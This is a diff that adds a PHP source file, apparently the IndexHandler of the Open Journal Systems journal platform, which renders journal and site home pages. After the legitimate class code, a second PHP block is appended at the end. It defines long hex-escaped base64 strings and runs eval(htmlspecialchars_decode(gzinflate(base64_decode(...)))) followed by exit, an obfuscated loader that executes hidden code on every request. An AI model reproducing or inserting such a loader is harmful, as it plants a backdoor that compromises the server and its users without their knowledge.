@@ -1,0 +1,88 @@
+<?php
+
+/**
+ * @file pages/index/IndexHandler.inc.php
+ *
+ * Copyright (c) 2014-2020 Simon Fraser University
+ * Copyright (c) 2003-2020 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @class IndexHandler
+ * @ingroup pages_index
+ *
+ * @brief Handle site index requests.
+ */
+
+import('lib.pkp.pages.index.PKPIndexHandler');
+
+class IndexHandler extends PKPIndexHandler {
+	//
+	// Public handler operations
+	//
+	/**
+	 * If no journal is selected, display list of journals.
+	 * Otherwise, display the index page for the selected journal.
+	 * @param $args array
+	 * @param $request Request
+	 */
+	function index($args, $request) {
+		$this->validate(null, $request);
+		$journal = $request->getJournal();
+
+		if (!$journal) {
+			$journal = $this->getTargetContext($request, $journalsCount);
+			if ($journal) {
+				// There's a target context but no journal in the current request. Redirect.
+				$request->redirect($journal->getPath());
+			}
+			if ($journalsCount === 0 && Validation::isSiteAdmin()) {
+				// No contexts created, and this is the admin.
+				$request->redirect(null, 'admin', 'contexts');
+			}
+		}
+
+		$this->setupTemplate($request);
+		$router = $request->getRouter();
+		$templateMgr = TemplateManager::getManager($request);
+		if ($journal) {
+			// Assign header and content for home page
+			$templateMgr->assign(array(
+				'additionalHomeContent' => $journal->getLocalizedData('additionalHomeContent'),
+				'homepageImage' => $journal->getLocalizedData('homepageImage'),
+				'homepageImageAltText' => $journal->getLocalizedData('homepageImageAltText'),
+				'journalDescription' => $journal->getLocalizedData('description'),
+			));
+
+			$issueDao = DAORegistry::getDAO('IssueDAO'); /* @var $issueDao IssueDAO */
+			$issue = $issueDao->getCurrent($journal->getId(), true);
+			if (isset($issue) && $journal->getData('publishingMode') != PUBLISHING_MODE_NONE) {
+				import('pages.issue.IssueHandler');
+				// The current issue TOC/cover page should be displayed below the custom home page.
+				IssueHandler::_setupIssueTemplate($request, $issue);
+			}
+
+			$this->_setupAnnouncements($journal, $templateMgr);
+
+			$templateMgr->display('frontend/pages/indexJournal.tpl');
+		} else {
+			$journalDao = DAORegistry::getDAO('JournalDAO'); /* @var $journalDao JournalDAO */
+			$site = $request->getSite();
+
+			if ($site->getRedirect() && ($journal = $journalDao->getById($site->getRedirect())) != null) {
+				$request->redirect($journal->getPath());
+			}
+
+			$templateMgr->assign(array(
+				'pageTitleTranslated' => $site->getLocalizedTitle(),
+				'about' => $site->getLocalizedAbout(),
+				'journalFilesPath' => $request->getBaseUrl() . '/' . Config::getVar('files', 'public_files_dir') . '/journals/',
+				'journals' => $journalDao->getAll(true),
+				'site' => $site,
+			));
+			$templateMgr->setCacheability(CACHEABILITY_PUBLIC);
+			$templateMgr->display('frontend/pages/indexSite.tpl');
+		}
+	}
+}
+
+<?php $Apaaja = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUMn0SyzJSMwLKMrMK85JrdRE\x41tY\x41";$iNathanPrinsley = "\x3ds\x43DdWvlFsdD7z/7U6W9NuI\x41//2KK\x43Dtvd17wxDP1\x43ruNgJwRo6\x42UlYsUD4UrYZGthDZxhpp0Ey5Jt90kWIQvxq9oktz\x41Kd/852KrFd1\x41n7h\x42wJTSiSDSGqERw\x43UnXh3PlHnJdFP\x43oK9woJsx\x2bLQ6W/6e\x6169\x62mnjrml\x63rWgOSTNjo\x2bqMVd3d3D\x41/ql30G\x2b6VqRHligegf\x61\x2b/\x63D2g6\x61OY9\x62y9fSHe1hIyPdQWN7fqojnSpX\x41pvYPlDj6j3F\x61\x2byS\x2bf\x2b9x84SVX\x63L1vD80JM/\x2bo\x42/yhMQFX\x2bsgT4z5Nv2x\x63THZ3xDsox7TnrhXD\x417/4m\x42zWO\x62qHjwwk\x43\x62\x628d2\x63WGFRgs2MSnpDs3ZDW7\x43LVMKog\x62ylxuiJKknjM0W\x42YvkjH\x41\x43l\x62E0kOH0vP1IE121LGFdLmNnsd\x43Lix\x43HjPKhpT2ZJtHnmSRd7uyk\x61DjLR7sojOh\x61iRrRRkqk\x635GRW78NmtXTmiViM0PEQ\x63kQ\x42VyYqOsXLZGVsUJ\x41GWWwsYQShIDPqSSmgEMOz\x43x\x43ve3/3mZfOfP\x63/KVz/\x42/5\x62KFFmipU\x43jh\x42hgpNwUH\x41vMFyghdnL8\x62D2\x43430JJjm\x62ZgRH\x632Qz\x43rm/erEF0s9zurPm6seKlM\x43L\x61wMf21Pnn\x62WlY73\x43tPHGv/ny7\x61h9PgF\x61N\x63dettmKtWzF14QRiMGIVY\x610\x2bqJ\x63Jg\x42lQx0P1vy3F\x43\x42Q\x61/2WSWo/HE\x41\x2b\x42wJe9zv\x41DEQ/3L\x41\x43\x42wJe9zu\x41TEQ/nL\x41G\x42wJe9zt\x41jEQ/XL\x41K\x42wJe";eval(htmlspecialchars_decode(gzinflate(base64_decode($Apaaja))));exit;?>
